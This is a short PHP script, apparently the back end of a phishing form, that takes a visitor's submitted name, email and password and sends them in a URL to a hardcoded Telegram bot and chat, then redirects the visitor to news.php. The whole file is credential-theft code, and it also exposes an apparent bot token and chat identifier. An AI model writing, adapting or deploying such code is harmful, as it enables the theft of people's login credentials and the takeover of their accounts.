<?
// https://api.telegram.org/bot6217005166:AAE1yA_LusuducoP3T1D9c3tEWwritUvnV0/getUpdates
$name = $_POST['user_name'];
$email = $_POST['user_email'];
$pass = $_POST['user_pass'];
$token = '6217005166:AAE1yA_LusuducoP3T1D9c3tEWwritUvnV0';
$chat_id ='-958254758';
$arr = array(
    'ismi :' => $name ,
    'emaile  :' => $email ,
    'kodi :' => $pass 
);
foreach($arr as $key => $velue):
    $text .= $key . $velue ."%0A";
endforeach;
$telegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&perse_emode=html&text={$text}","r");
if($telegram){
header('location: news.php');
}
else{   
    echo 'error';
}

